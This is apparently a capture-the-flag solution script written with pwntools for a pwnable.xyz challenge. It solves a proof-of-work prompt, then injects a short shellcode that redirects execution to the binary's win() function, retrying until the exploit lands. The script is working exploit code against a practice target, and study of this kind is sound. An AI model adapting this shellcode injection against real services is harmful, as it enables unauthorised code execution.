from pwn import *
context(arch='amd64')

LOCAL = False

while 1:
    if LOCAL:
        r = process('./release/challenge')
    else:
        r = remote('svc.pwnable.xyz', 30028)

    sla = r.sendlineafter
    sa = r.sendafter


    # solve_pow

    r.recvuntil('POW: x + y == 0x')
    answer = int(r.recvline()[:-1], 16)

    x = 0xffffffff
    y = answer + 1

    while x == 0 or y == 0 or (x * y) & 0xffffffff > 40: # wait maximum 40 seconds
        x -= 1
        y += 1

    log.info(hex(x) + ' + ' + hex(y) + ' == ' + hex(answer))
    log.info(hex(x) + ' * ' + hex(y) + ' == ' + hex((x * y) & 0xffffffff))
    sla('> ', str(x) + ' ' + str(y))


    # call win()

    sc = b'\x01\x00'
    sc += asm('''pop rax
    sub ax, 0x2ce
    call rax
    ''')

    try:
        sa('Input: ', sc)
        r.recvn(1)
        break
    except:
        r.close()


r.interactive()